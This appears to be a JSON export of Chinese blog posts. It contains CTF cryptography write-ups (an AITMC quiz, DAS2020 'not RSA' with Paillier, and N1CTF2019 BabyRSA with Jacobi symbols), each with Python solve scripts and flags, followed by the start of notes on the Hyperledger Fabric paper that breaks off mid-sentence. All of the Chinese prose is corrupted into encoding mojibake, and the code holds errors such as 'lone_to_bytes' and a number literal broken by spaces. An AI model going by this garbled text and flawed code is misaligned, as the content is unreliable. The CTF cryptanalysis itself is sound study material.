æ­¤ï¼Œåªéœ€è¦å°† c1, c2 å’Œ d è½¬æ¢æˆ bytesï¼Œç„¶åå¯¹æ¯ä¸€ä½å– ord åè¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œç»„æˆçš„æ•°å­—å– chr ååŠ åˆ°ç­”æ¡ˆå­—ç¬¦ä¸²åé¢ï¼Œå³å¯å¾—åˆ° flagã€‚\nexp import math from AITMCLab.libnum.modular import invmod from AITMCLab.Crypto.Util.number import long_to_bytes from AITMCLab.Crypto.Util.number import bytes_to_long from AITMCLab.Crypto.Util.number import isPrime def nextPrime(n): n += 2 if n \u0026amp; 1 else 1 while not isPrime(n): n += 2 return n if __name__ == \u0026#34;__main__\u0026#34;: e = 11248112333656902878308992204660514716130692202019193081806766887380465145401754698746718075268681481388695805324253817155823465013590321091178897918430457 c1 = 5120829596353532760839054347975234579355835073413768618360492980516438193909447500996222328143719619379838946544412967584025416378147246422705451415437468 c2 = 17985907282297772406857113433926323639543183645704827789984971602150950301590677893419082 E = nextPrime(e) f_1 = 1 i = e + 1 while i \u0026lt; E - 1: f_1 *= i f_1 %= E i += 1 f = invmod(f_1, E) # ä»¥ä¸Šä¸ºæ±‚è§£fçš„è¿‡ç¨‹ d = long_to_bytes(f) c1_bytes = long_to_bytes(c1) c2_bytes = lone_to_bytes(c2) flag = \u0026#34;\u0026#34; for i in range(len(c2_bytes)): flag += chr(ord(c2_bytes[i]) ^ ord(c1_bytes[i]) ^ ord(d[i])) print flag # flag{Congratulation!_quiz1_passed!!!} [DAS2020 April]not RSA é¢˜ç›® from AITMCLab.libnum import gcd, invmod, s2n from Crypto.Util.number import isPrime from secret import flag p = 104879397075344024438671231239628115011303349344697797964879592144922079000957 q = 104879397075344024438671231239628115011303349344697797964879592144922079001013 assert isPrime(p) and isPrime(q) n = p * q flag = s2n(flag) r = randint(1, n) c = (pow(n + 1, flag, n * n) * pow(r, n, n * n)) % (n * n) print c # c = 13134489820394613222282607681686272081419875146946401883172682167011759113388373349180457979897848113275982219264879081189886853062717764580364698888338032141434053832247476010400449272010082460437747190468766740274587999336359171283098137261396013153130265440425676242061845667887640808895666325466803989428 æ€è·¯ ä»£ç å¾ˆç®€å•ï¼Œå°±æ˜¯é“çº¯æ•°å­¦é¢˜\nç”±æºç ï¼š\n$c\\equiv (n+1)^f\\cdot r^n\\ (\\mathrm{mod}\\ n^2)$\næ ¹æ®äºŒé¡¹å¼å®šç†ï¼š\n$c\\equiv (fn+1)\\cdot r^n\\ (mod\\ n^2)$\nå·¦å³ä¸¤å¼åŒä¹˜ $\\varphi(n)$ æ¬¡æ–¹ï¼Œå¾— $c^{\\varphi(n)}\\equiv (fn+1)^{\\varphi(n)}\\cdot r^{n\\varphi(n)}\\ (mod\\ n^2)$\nç”± $\\varphi(n^2)=n\\cdot \\varphi(n)$ ä¸”å½“ $r\\neq p$ æˆ– $r\\neq q$ æ—¶æœ‰ï¼Œ$gcd(r,n)=1$ å¯çŸ¥ï¼Œ$r^{n\\varphi(n)}\\equiv 1\\ (mod\\ n^2)$ï¼Œå¯å¾—ï¼š\n$c^{\\varphi(n)}\\equiv (fn+1)^{\\varphi(n)}\\ (mod\\ n^2)$\nå› ä¸º r ä¸ºéšæœºæ•°ï¼Œæ‰€ä»¥ $r\\neq p,q$ çš„æ¦‚ç‡ä¸º $\\dfrac{2}{n}$ï¼Œå¯è®¤ä¸º $gcd(r,n)=1$ æˆç«‹ã€‚\nå†æ¬¡ä½¿ç”¨äºŒæ¬¡é¡¹å®šç†ï¼Œå¯å¾— $c^{\\varphi(n)}\\equiv fn\\varphi(n)+1\\ (mod\\ n^2)$\nç”±è´¹æ›¼å°å®šç†å¯çŸ¥ $c^{\\varphi(n)}\\equiv 1\\ (mod\\ n)$ï¼Œå³ $n|c^{\\varphi(n)}-1$ï¼Œå› æ­¤å°†1ç§»åˆ°åŒä½™å¼å·¦è¾¹å¹¶å¯¹åŒä½™å¼åŒé™¤nï¼Œå¾—ï¼š\n$\\dfrac{c^{\\varphi(n)}-1}{n}\\equiv f\\varphi(n)\\ (mod\\ n)$\nå¯¹äºå·¦å¼ï¼Œè®¾ $\\dfrac{c^{\\varphi(n)}-1}{n}=kn+r'$\n$c^{\\varphi(n)}=kn^2+rn+1$\nåªéœ€æ±‚è§£å‡º $rn+1$ å³å¯ï¼Œå› æ­¤å¯ä»¥å¯¹ $c^{\\varphi(n)}$ è¿›è¡Œæ¨¡ $n^2$ï¼Œå®ç°æ—¶å¯ç›´æ¥ä½¿ç”¨ python ä¸­çš„ pow å‡½æ•°ã€‚\nå°†å·¦å¼æ±‚è§£åï¼ŒåŒ–ä¸ºæ±‚è§£ $\\varphi(n)\\cdot f\\equiv r\u0026rsquo;\\ (mod\\ n)$ï¼Œå³ $f\\equiv \\varphi(n)^{-1}\\cdot r\u0026rsquo;\\ (mod\\ n)$\nä»£ç  from AITMCLab.libnum import s2n, invmod, n2s c = 131344898203946132222826076816862720814198751469464018831726821670 117591133883733491804579798978481132759822192648790811898868530627 177645803646988883380321414340538322474760104004492720100824604377 471904687667402745879993363591712830981372613960131531302654404256 76242061845667887640808895666325466803989428 p = 104879397075344024438671231239628115011303349344697797964879592144 922079000957 q = 104879397075344024438671231239628115011303349344697797964879592144 922079001013 phi_n = (p - 1) * (q - 1) n = p * q r = (pow(c, phi_n, n * n) - 1) // n print n2s(r * invmod(phi_n, n) % n) # flag{can_you_find_me??} æ€»ç»“ çº¯æ•°å­¦é¢˜\nå­¦é•¿å¸¦ç€æ¨äº†ä¸€éã€‚ã€‚ã€‚è¿™ä¹Ÿå¤ªéš¾äº†ã€‚ã€‚ã€‚\nå¬è¯´æ˜¯ paillier åŠ å¯†ï¼Œæœç„¶æ˜¯ not RSA\n[N1CTF2019]BabyRSA é¢˜ç›® from Crypto.Util import number import random from secret import flag N = 23981306327188221819291352455300124608114670714977979223022816906368788909398653961976023086718129607035805397846230124785550919468973090809881210560931396002918119995710297723411794214888622784232065592366390586879306041418300835178522354945438521139847806375923379136235993890801176301812907708937658277646761892297209069757559519399120988948212988924583632878840216559421398253025960456164998680766732013248599742397199862820924441357624187811402515396393385081892966284318521068948266144251848088067639941653475035145362236917008153460707675427945577597137822575880268720238301307972813226576071488632898694390629 e = 0x10001 m = number.bytes_to_long(flag) with open(\u0026#39;flag.enc\u0026#39;, \u0026#39;w\u0026#39;) as f: while m: padding = random.randint(0, 2**1000) ** 2 message = padding \u0026lt;\u0026lt; 1 + m % 2 cipher = pow(message, e, N) f.write(hex(cipher)+\u0026#39;n\u0026#39;) m /= 2 æ€è·¯ é¦–å…ˆé˜…è¯»ä»£ç ã€‚\nwhile m: # several operations m /= 2 ç”±ä¸Šè¿°ä»£ç éƒ¨åˆ†ä»¥åŠè¿‡ç¨‹ä¸­å‡ºç°äº† m % 2 æ“ä½œå¯çŸ¥ï¼Œflag çš„äºŒè¿›åˆ¶æ•°æ®æ¯ä¸€ä½è¢«å­˜è¿›äº† key.enc æ–‡ä»¶çš„æ¯è¡Œæ•°æ®ä¸­ï¼Œå› æ­¤å¯¹ key.enc æ–‡ä»¶çš„æ¯ä¸€è¡Œè¿›è¡Œè¯»å–ï¼Œåªè¦èƒ½å¤Ÿåˆ¤æ–­è¯¥ä½ä¸º0è¿˜æ˜¯1ï¼Œå³å¯å®Œæˆè§£å¯†ã€‚\npadding = random.randint(0, 2**1000) ** 2 message = padding \u0026lt;\u0026lt; pow(m, p - 1, p) + m % 2 cipher = pow(message, e, N) ç”±ä¸Šè¿°ä»£ç å¯çŸ¥ï¼Œ$c\\equiv m^e\\ (\\mathrm{mod}\\ N), m = r^2\\cdot 2^{1+flag%2}$ ï¼ˆrä¸ºrandomç»“æœï¼‰ï¼Œå› æ­¤ m % 2 = 1 æ—¶ï¼Œæœ‰$c\\equiv r^2\\cdot 2^2\\equiv (2^er^e)^2\\ (\\mathrm{mod}\\ N)$ï¼Œè€Œ m % 2 = 0 æ—¶ï¼Œæœ‰$c\\equiv 2^e\\cdot r^{2^e}$ã€‚\né¦–å…ˆçŒœæµ‹å¯ä»¥é€šè¿‡ç ´è§£RSAå¯†ç ï¼Œå°†åŠ å¯†ä¿¡æ¯è¿˜åŸä¸ºæ˜æ–‡ä¿¡æ¯ï¼Œåˆ¤æ–­è¯¥æ•°æ•´é™¤ 2 çš„å¥‡æ•°æ¬¡æ–¹è¿˜æ˜¯å¶æ•°æ¬¡æ–¹å³å¯å¾—çŸ¥è¯¥ä½çš„äºŒè¿›åˆ¶æ•°ã€‚ä½¿ç”¨ factordb ç½‘ç«™å¤±è´¥åè´¼å¿ƒä¸æ­»ï¼Œåˆå°è¯•äº†ç½‘ä¸Šæ‰¾çš„å¤šç§æ”»å‡»è„šæœ¬ï¼Œå‘ç°å‡æ— æ³•åˆ†è§£ï¼Œäºæ˜¯å¯»æ‰¾å…¶å®ƒæ–¹æ³•ã€‚\nè§‚å¯ŸREADME.mdå‘ç°ï¼Œæœ¬é¢˜å¯ä»¥å°è¯•ç”¨äºŒæ¬¡å‰©ä½™æ±‚è§£ã€‚m % 2 = 1 æ—¶ï¼Œæœ‰ $c\\equiv (2^er^e)^2\\ (\\mathrm{mod}\\ N)$ï¼Œm% 2 = 0 æ—¶ï¼Œæœ‰ $c\\equiv (2\\cdot r^2)^e\\ (\\mathrm{mod}\\ N)$ï¼Œå› æ­¤ï¼Œå½“ c ä¸º N çš„äºŒæ¬¡å‰©ä½™æ—¶ï¼Œå¯¹åº”m % 2 = 1ï¼Œc ä¸º N çš„äºŒæ¬¡éå‰©ä½™æ—¶ï¼Œå¯¹åº” m % 2 = 0ã€‚\nå¯ä»¥ä½¿ç”¨ Jacobi åˆ¤æ–­æ˜¯å¦ä¸ºäºŒæ¬¡å‰©ä½™ã€‚åªéœ€æ»¡è¶³ $\\left(\\dfrac{2^e\\cdot r^{2^e}}{N}\\right)=-1$ å³å¯æ±‚è§£ã€‚ç”±äº $\\left(\\dfrac{2^e\\cdot r^{2^e}}{N}\\right)=\\left(\\dfrac{2}{p}\\right)\\left(\\dfrac{2}{q}\\right)$ï¼Œæ‰€ä»¥å½“ m % 2 = 0 æ—¶ï¼ŒJacobi è®¡ç®—ç»“æœä»…å–å†³äº p å’Œ qï¼Œä¸”åœ¨å®é™…è®¡ç®—ä¸­å‘ç°å­˜åœ¨ Jacobi è®¡ç®—ç»“æœä¸º -1 çš„æƒ…å†µï¼Œåˆå› ä¸º m % 2 = 1 æ—¶ Jacobi è®¡ç®—ç»“æœå¿…ç„¶ä¸º 1ï¼Œè¯´æ˜æœ¬é¢˜ä¸­ 2 åˆ†åˆ«æ˜¯ p å’Œ q çš„äºŒæ¬¡å‰©ä½™å’ŒäºŒæ¬¡éå‰©ä½™ï¼Œå¯å¾—\nå½“ $m\\equiv 0\\pmod 2$ï¼Œ$\\left(\\dfrac{c}{N}\\right)= \\left(\\dfrac{2}{p}\\right)\\left(\\dfrac{2}{q}\\right)=-1$\nå½“ $m\\equiv 1\\pmod 2$ï¼Œ$\\left(\\dfrac{c}{N}\\right)= 1$\nå› æ­¤å¯ä»¥ç”¨ Jacobi æ¥è®¡ç®— flag çš„äºŒè¿›åˆ¶ç»“æœã€‚\nexp from AITMCLab.Crypto.Util.number import long_to_bytes def jacobi(a, b): res = 1 if a == 2: return (-1) ** ((b * b - 1) / 8) if a == b - 1: return (-1) ** ((b - 1) / 2) if a == 1: return 1 while a % 2 == 0: res *= jacobi(2, b) a /= 2 res *= (-1)**((a - 1) * (b - 1) / 4) * jacobi(b % a, a) return res n = 23981306327188221819291352455300124608114670714977979223022816906368788909398653961976023086718129607035805397846230124785550919468973090809881210560931396002918119995710297723411794214888622784232065592366390586879306041418300835178522354945438521139847806375923379136235993890801176301812907708937658277646761892297209069757559519399120988948212988924583632878840216559421398253025960456164998680766732013248599742397199862820924441357624187811402515396393385081892966284318521068948266144251848088067639941653475035145362236917008153460707675427945577597137822575880268720238301307972813226576071488632898694390629 flag = 0 i = 0 with open(\u0026#39;key.enc\u0026#39;, \u0026#39;r\u0026#39;) as f: for line in f: line = line.strip(\u0026#34;L\\n\u0026#34;) # Filter out \u0026#34;L\\n\u0026#34; at the end of line cur = int(line, 16) # Convert hax string to number if (jacobi(cur, n) == 1): flag += 1 \u0026lt;\u0026lt; i i += 1 print flag print flag print long_to_bytes(flag) # N1CTF{You_can_leak_the_jacobi_symbol_from_RSA} é¦–å…ˆä»key.encä¸­é€è¡Œè¯»å–ï¼Œå¹¶å¯¹æ¯ä¸€è¡Œç»“å°¾çš„\u0026rsquo;L\\n\u0026rsquo;è¿›è¡Œè¿‡æ»¤ï¼Œå°†å…¶è½¬æ¢ä¸ºæ•´æ•°curåï¼Œè®¡ç®—Jacobiç¬¦å·$J\\left( cur, N\\right)$ã€‚è®¡ç®—Jacobiç¬¦å·æ—¶ä¸»è¦ä½¿ç”¨äºŒæ¬¡äº’åå¾‹è¿›è¡Œè®¡ç®—ï¼ˆå¯ä»¥å†ä½¿ç”¨å…¶å®ƒå®šå¾‹è¿›è¡ŒåŠ é€Ÿï¼Œä½†æ²¡å¿…è¦ï¼‰ã€‚\nç”±äºç¬¬ä¸€è¡Œå‚¨å­˜çš„ä¸ºflagçš„æœ€åä¸€ä½ï¼ˆå³ä»åå¾€å‰å‚¨å­˜ï¼‰ï¼Œå› æ­¤è¿›è¡Œflag += 1 \u0026lt;\u0026lt; iå³å¯å°†ç›¸åº”ä½ç½®çš„äºŒè¿›åˆ¶ç»“æœè¿˜åŸã€‚\næ€»ç»“ è¿™é“é¢˜åœ¨ä»£ç é˜…è¯»ä¸Šéš¾åº¦è¾ƒä½ï¼Œå”¯ä¸€éœ€è¦ç•™æ„çš„åœ°æ–¹å°±æ˜¯padding \u0026lt;\u0026lt; pow(m, p - 1, p) + m % 2è¿™ä¸ªè¿ç®—çš„ä¼˜å…ˆçº§é—®é¢˜ï¼ˆæ„Ÿè°¢bgçš„æ³¨é‡Šæç¤ºï¼‰ã€‚æŠŠä»£ç è½¬æ¢æˆæ•°å­¦å…¬å¼åï¼ŒäºŒæ¬¡å‰©ä½™çš„æ–¹æ³•å°±æ¯”è¾ƒæ˜æ˜¾äº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯Jacobiç¬¦å·æ— æ³•å‡†ç¡®åˆ¤æ–­äºŒæ¬¡å‰©ä½™ä¸äºŒæ¬¡éå‰©ä½™ï¼ˆæ„Ÿè°¢bgæŒ‡å‡ºäº†è¿™ä¸ªé—®é¢˜ï¼‰ï¼Œç®€å•æ¨å¯¼åå‘ç°è¿™ä¸ªæ–¹æ³•æœ‰ä¸€å®šçš„ä½¿ç”¨æ¡ä»¶ï¼Œå¦‚æœé¢˜ç›®ä¸­çš„på’Œqä¸æ»¡è¶³ä¸€å®šçš„æ¡ä»¶ï¼Œè¿™ä¸ªæ–¹æ³•å°±æ— æ³•æ­£ç¡®åŒºåˆ†0å’Œ1ã€‚\nåç» ssgss å¸ˆå‚…æé†’å‘ç°è¿™é“é¢˜ç”¨çš„æ˜¯ Goldwasser-Micali å¯†ç ï¼ˆä¸Šè¯¾èµ°ç¥å®é”¤äº†ï¼‰ã€‚ç®€å•å¯¹æ¯”å‘ç°ï¼Œå½“GMå¯†ç é€‰å–çš„xæ»¡è¶³ J(x, p) = 1 ä¸” J(x, q) = -1 æ—¶ï¼Œå¯èƒ½èƒ½å¤Ÿåˆ©ç”¨æœ¬é¢˜çš„æ–¹æ³•è¿›è¡Œç ´è§£ã€‚å› æ­¤é€‰å–çš„ x ä¸èƒ½ä»…æ»¡è¶³æ˜¯ n çš„äºŒæ¬¡éå‰©ä½™ï¼Œéœ€è¦åŒæ—¶æ˜¯ p å’Œ q çš„äºŒæ¬¡éå‰©ä½™ã€‚\n","date":"2020-12-09T23:27:25Z","permalink":"/post/aitmc-challenge/","title":"AITMC-challenge"},{"content":"å‚è€ƒæ–‡çŒ®ï¼šHyperledger Fabric: A Distributed Operation System for Permissioned Blockchains\næ¶æ„ æ•´ä½“ç»“æ„ Fabricæ˜¯ä¸€ä¸ªè®¸å¯åŒºå—é“¾çš„åˆ†å¸ƒå¼æ“ä½œç³»ç»Ÿï¼Œå¯ä»¥æ‰§è¡Œå¤šç§ç¼–ç¨‹è¯­è¨€ç¼–å†™çš„åˆ†å¸ƒå¼åº”ç”¨ã€‚å®ƒèƒ½å¤Ÿåœ¨ä¸€ä¸ªåªèƒ½è¿½åŠ çš„æ•°æ®ç»“æ„ä¸­å®‰å…¨åœ°è·Ÿè¸ªæ‰§è¡Œå†å²ï¼Œå¹¶ä¸”æ²¡æœ‰å†…ç½®çš„åŠ å¯†è´¦æœ¬ã€‚\nFabricä½¿ç”¨äº†â€œæ‰§è¡Œ-order-éªŒè¯â€çš„åŒºå—é“¾æ¶æ„ï¼Œè€Œæ²¡æœ‰éµé¡¼æ ‡å‡†çš„â€œorder-æ‰§è¡Œâ€è®¾è®¡ã€‚å…¶æ•´ä½“çš„åˆ†å¸ƒå¼åº”ç”¨å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†\næ™ºèƒ½åˆçº¦ï¼Œç§°ä¸ºé“¾ç  (Chaincode) ï¼Œæ˜¯ä¸€æ®µå®ç°äº†åº”ç”¨é€»è¾‘çš„ç¨‹åºä»£ç ï¼Œå¹¶åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è¿è¡Œã€‚é“¾ç æ˜¯Fabricåˆ†å¸ƒå¼åº”ç”¨çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œå¯èƒ½ä¼šè¢«æœªå—ä¿¡ä»»çš„å¼€å‘è€…ä¿®æ”¹ã€‚æœ‰ä¸€ç§ç‰¹æ®Šçš„é“¾ç è¢«ç”¨äºç®¡ç†åŒºå—é“¾ç³»ç»Ÿå¹¶ç»´æŠ¤å‚æ•°ï¼Œè¢«ç§°ä¸ºç³»ç»Ÿé“¾ç  (system chaincode)\nèƒŒä¹¦æ”¿ç­– (endorsement policy) åœ¨éªŒè¯é˜¶æ®µè¿›è¡Œè¯„ä»·ã€‚è®¸å¯æ”¿ç­–æ— æ³•è¢«æœªå—ä¿¡ä»»çš„å¼€å‘è€…é€‰æ‹©æˆ–ä¿®æ”¹ã€‚å…¶åœ¨åŒºå—é“¾ä¸­å……å½“ä¸€ä¸ªç”¨äºäº‹ç‰©éªŒè¯çš„é™æ€åº“ï¼Œä¸”åªèƒ½é€šè¿‡é“¾ç è¿›è¡Œå‚æ•°åŒ–ã€‚åªæœ‰æŒ‡å®šçš„ç®¡ç†å‘˜æœ‰æƒé™ä½¿ç”¨ç³»ç»Ÿç®¡ç†åŠŸèƒ½ä¿®æ”¹ã€‚\nâ€œæ‰§è¡Œ-æ’åº-éªŒè¯â€ç»“æ„ç¤ºæ„å›¾ï¼š\nä¸€ä¸ªå®¢æˆ·ç«¯å‘èƒŒä¹¦æ”¿ç­–æŒ‡å®šçš„peerèŠ‚ç‚¹(peers)å‘é€äº¤æ˜“ã€‚è¿™ä¸ªäº¤æ˜“è¢«ç‰¹æ®Šçš„peerèŠ‚ç‚¹æ‰§è¡Œå¹¶ä¸”è®°å½•è¾“å‡ºä¿¡æ¯ï¼Œè¿™ä¸€æ­¥éª¤è¢«ç§°ä¸ºèƒŒä¹¦ã€‚æ‰§è¡Œå®Œæˆåï¼Œäº¤æ˜“è¿›å…¥äº†æ’åº(ordering)é˜¶æ®µï¼Œåœ¨è¿™ä¸€ä¸ªé˜¶æ®µä¸­ï¼Œä½¿ç”¨äº†ä¸€ç§å¯æ’å…¥çš„å…±è¯†åè®®æ¥äº§ç”Ÿä¸€ä¸ªå®Œæˆæ’åºçš„å·²èƒŒä¹¦äº¤æ˜“çš„åºåˆ—ï¼Œå¹¶æŒ‰åŒºå—åˆ†ç»„ã€‚è¿™äº›äº¤æ˜“è¢«å¹¿æ’­åˆ°æ‰€æœ‰çš„èŠ‚ç‚¹ã€‚è¿™ä¸ªåºåˆ—çš„é¡ºåºç”±è¾“å‡ºå’ŒçŠ¶æ€çš„ä¾èµ–æ€§å†³å®šã€‚åœ¨éªŒè¯é˜¶æ®µï¼Œæ¯ä¸ªpeerèŠ‚ç‚¹éƒ½éœ€è¦æ ¹æ®èƒŒä¹¦æ”¿ç­–å’Œæ‰§è¡Œçš„ä¸€è‡´æ€§å¯¹å·²èƒŒä¹¦äº¤æ˜“çš„çŠ¶æ€å˜åŒ–è¿›è¡ŒéªŒè¯ã€‚æ‰€æœ‰peerèŠ‚ç‚¹éƒ½å·²ç›¸åŒçš„é¡ºåºè¿›è¡ŒéªŒè¯ï¼Œå› æ­¤ç»“æœå…·æœ‰ç¡®å®šæ€§ã€‚\nFabricç½‘ç»œæ”¯æŒå¤šä¸ªåŒºå—é“¾é“¾æ¥åˆ°åŒä¸€ä¸ªæ’åºæœåŠ¡ä¸Šã€‚æ¯ä¸ªåŒºå—é“¾è¢«ç§°ä¸ºä¸€ä¸ªé€šé“(Channel)ï¼Œå¯ä»¥æœ‰ä¸åŒçš„peerèŠ‚ç‚¹ä½œä¸ºå…¶æˆå‘˜ã€‚è¿™äº›é€šé“å¯ä»¥è¢«ç”¨æ¥åˆ†ç¦»ä¸åŒçš„åŒºå—é“¾ä¹‹é—´çš„çŠ¶æ€ï¼Œä½†æ¯ä¸ªé€šé“çš„å…±è¯†å¹¶ä¸ä¸€è‡´ï¼Œå¹¶ä¸”é€šé“ä¸­çš„äº¤æ˜“é¡ºåºæ˜¯ç›¸äº’åˆ†å¼€çš„ã€‚è®¤ä¸ºæ‰€æœ‰æ’åºéƒ½æ˜¯å¯ä¿¡çš„éƒ¨ç½²ï¼Œå¯ä»¥é€šè¿‡é€šé“è®¿é—®æ§åˆ¶æ¥å®ç°å¯¹èŠ‚ç‚¹çš„æ§åˆ¶ã€‚\nå…¶ä¸­çš„èŠ‚ç‚¹å¯åˆ†ä¸ºï¼šå®¢æˆ·ç«¯ã€peerèŠ‚ç‚¹ï¼ˆå…¶ä¸­ä¸€éƒ¨åˆ†ä¸ºèƒŒä¹¦èŠ‚ç‚¹ï¼‰ã€æ’åºæœåŠ¡èŠ‚ç‚¹(OSN, Ordering Service Nodes or orderers)\näº¤æ˜“çš„ä¸‰ä¸ªé˜¶æ®µ transaction_flow æ‰§è¡Œé˜¶æ®µ åœ¨æ‰§è¡Œé˜¶æ®µï¼Œå®¢æˆ·ç«¯ç­¾ç½²å¹¶å‘é€ä¸€ä¸ªäº¤æ˜“ææ¡ˆç»™ä¸€ä¸ªæˆ–å¤šä¸ªèƒŒä¹¦èŠ‚ç‚¹æ¥æ‰§è¡Œï¼ˆæ ¹æ®èƒŒä¹¦æ”¿ç­–ï¼Œæ¯ä¸ªchaincodeéƒ½æœ‰ç‰¹å®šçš„ä¸€ç»„èƒŒä¹¦èŠ‚ç‚¹ï¼‰ã€‚ä¸€ä¸ªäº¤æ˜“ææ¡ˆåŒ…å«äº†æäº¤å®¢æˆ·ç«¯çš„èº«ä»½ï¼ˆæ ¹æ®MSPï¼‰ï¼Œäº¤æ˜“çš„è½½è·ã€å‚æ•°ã€é“¾ç æ ‡è¯†ç¬¦ã€æ¯ä¸ªå®¢æˆ·ç«¯åªèƒ½ä½¿ç”¨ä¸€æ¬¡çš„nonceï¼ˆéšæœºå€¼æˆ–è®¡æ•°å™¨ï¼‰ï¼Œä»¥åŠå®¢æˆ·ç«¯æ ‡è¯†ç¬¦å’Œnonceç”Ÿæˆçš„äº¤æ˜“æ ‡è¯†ç¬¦ã€‚\nèƒŒä¹¦èŠ‚ç‚¹ä¼šå¯¹äº¤æ˜“ææ¡ˆè¿›è¡Œæ¨¡æ‹Ÿï¼Œåœ¨æŒ‡å®šçš„åŒºå—é“¾é“¾ç ä¸Šæ‰§è¡Œæ“ä½œã€‚æ¨¡æ‹Ÿæ“ä½œåœ¨èƒŒä¹¦èŠ‚ç‚¹çš„æœ¬åœ°åŒºå—é“¾çŠ¶æ€ä¸­è¿›è¡Œæ¨¡æ‹Ÿï¼Œä¸ä¸å…¶å®ƒèŠ‚ç‚¹åŒæ­¥ï¼Œä¹Ÿä¸ä¼šå°†æ¨¡æ‹Ÿçš„ç»“æœæ°¸ä¹…åŒ–åˆ°å¸æœ¬ä¸­ã€‚åŒºå—é“¾çš„çŠ¶æ€ä»ç„¶ç”±èŠ‚ç‚¹äº¤æ˜“ç®¡ç†å™¨(Peer Transaction Manager)ç»´æŠ¤ã€‚ä¸€ä¸ªé“¾ç åˆ›å»ºçš„çŠ¶æ€åªèƒ½é™å®šåœ¨è¯¥é“¾ç ä¸Šï¼Œä¸èƒ½è¢«å…¶ä»–çš„é“¾ç ç›´æ¥è®¿é—®ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé“¾ç åªèƒ½ç»´æŠ¤GetStateã€PutStateã€DelStateæ“ä½œè®¿é—®çš„å†…å®¹ï¼ˆå¯èƒ½æ„æ€æ˜¯ï¼šéœ€è¦ä½¿ç”¨è¿™äº›æ¥å£è¿›è¡Œè®¿é—®ï¼Œä¸èƒ½ç›´æ¥ä¿®æ”¹ï¼ŒçŒœæµ‹çŠ¶æ€æƒé™ä¸ºprivateï¼‰ã€‚ç»™äºˆé€‚å½“çš„æƒé™ï¼Œé“¾ç å¯ä»¥è°ƒç”¨åŒä¸€ä¸ªé€šé“çš„é“¾ç ï¼Œå¹¶è®¿é—®å…¶çŠ¶æ€ã€‚\nåœ¨æ¨¡æ‹Ÿåï¼ŒèƒŒä¹¦èŠ‚ç‚¹ä¼šäº§ç”Ÿä¸€ä¸ªwritesetï¼Œå…¶ä¸­åŒ…æ‹¬æ¨¡æ‹Ÿäº§ç”Ÿçš„çŠ¶æ€æ›´æ–°ï¼Œå’Œä¸€ä¸ªreadsetï¼Œä»£è¡¨äº¤æ˜“ææ¡ˆæ¨¡æ‹Ÿçš„ç‰ˆæœ¬ä¾èµ–ï¼ˆæ¨¡æ‹Ÿæ—¶çš„æ‰€æœ‰å¯†é’¥ä»¥åŠå¯¹åº”çš„ç‰ˆæœ¬å·ï¼‰ã€‚åœ¨æ¨¡æ‹Ÿç»“æŸåï¼ŒèƒŒä¹¦èŠ‚ç‚¹ä¼šä»¥åŠ å¯†çš„æ–¹å¼ç­¾ç½²ä¸€ä»½â€œèƒŒä¹¦â€æ¶ˆæ¯ï¼ŒåŒ…æ‹¬äº†writesetå’Œreadsetï¼ˆåŒ…æ‹¬äº¤æ˜“idå’ŒèƒŒä¹¦èŠ‚ç‚¹çš„ä¸€äº›æ•°æ®ï¼‰ï¼Œéšåä»¥å“åº”çš„æ–¹å¼å‘é€ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯æ”¶é›†èƒŒä¹¦ï¼Œç›´åˆ°æ»¡è¶³é“¾ç çš„èƒŒä¹¦æ”¿ç­–ï¼Œå¼€å§‹äº¤æ˜“ã€‚ç‰¹åˆ«çš„ï¼Œè¿™è¦æ±‚æ”¿ç­–å†³å®šçš„æ‰€æœ‰èƒŒä¹¦èŠ‚ç‚¹éƒ½è¿”å›ç›¸åŒçš„writesetå’Œreadsetã€‚ç„¶åï¼Œå®¢æˆ·ç«¯å°†ç»§ç»­åˆ›å»ºäº¤æ˜“ï¼Œå¹¶ä¼ é€’ç»™æ’åºé˜¶æ®µã€‚\næ’åºé˜¶æ®µ å®¢æˆ·ç«¯æ”¶é›†åˆ°è¶³å¤Ÿçš„èƒŒä¹¦åï¼Œå°†ä¼šæŠŠäº¤æ˜“ç»„è£…èµ·æ¥å¹¶å‘é€ç»™æ’åºæœåŠ¡ç«¯ã€‚æ•´ä¸ªäº¤æ˜“åŒ…æ‹¬äº†è½½è·(payload)ï¼ˆåŒ…æ‹¬å‚æ•°çš„é“¾ç æ“ä½œï¼‰ã€äº¤æ˜“å…ƒæ•°æ®ã€èƒŒä¹¦çš„é›†åˆã€‚æ’åºé˜¶æ®µå¯¹æ¯ä¸ªé€šé“çš„æ‰€æœ‰æäº¤å»ºç«‹äº†ä¸€ä¸ªæ’åºã€‚æ’åºæœåŠ¡ç«¯ä¼šå°†å¤šä¸ªäº¤æ˜“åˆ†æˆå—ï¼Œè¾“å‡ºåŒ…å«äº¤æ˜“çš„å“ˆå¸Œé“¾åºåˆ—ï¼Œä»¥æé«˜å¹¿æ’­åè®®çš„ååé‡ã€‚\nbroadcast(tx)ï¼šå®¢æˆ·ç«¯è°ƒç”¨è¿™ä¸ªå‡½æ•°æ¥å¹¿æ’­äº¤æ˜“txï¼ŒåŒ…å«äº†è½½è·å’Œç­¾åã€‚ B $\\leftarrow$ deliver(s)ï¼šå®¢æˆ·ç«¯è°ƒç”¨è¿™ä¸ªå‡½æ•°æ¥è·å–éè´Ÿåºåˆ—å·sçš„åŒºå—Bï¼Œ$B=([tx_1,tx_2,\\ldots,tx_k],h)$ï¼Œ$h$ä¸ºs-1åŒºå—çš„å“ˆå¸Œå€¼ã€‚ æ’åºæœåŠ¡ç¡®ä¿äº†ä¸€ä¸ªé€šé“ä¸­çš„äº¤ä»˜åŒºå—è¢«å®Œå…¨æ’åºï¼Œç¡®ä¿å®‰å…¨ã€‚\nç„¶è€Œï¼Œæ¯ä¸€ä¸ªå•ç‹¬çš„æ’åºå®ç°éƒ½å…è®¸åœ¨å®¢æˆ·ç«¯è¯·æ±‚ä¸­ä¿è¯è‡ªå·±çš„æ´»è·ƒæ€§ä¸å…¬å¹³æ€§ã€‚\nç”±äºåŒºå—é“¾ä¸­åŒ…å«äº†å¤§é‡çš„èŠ‚ç‚¹ï¼Œä½†ä»…æœ‰å°‘éƒ¨åˆ†èŠ‚ç‚¹å®ç°äº†æ’åºæœåŠ¡ï¼Œå› 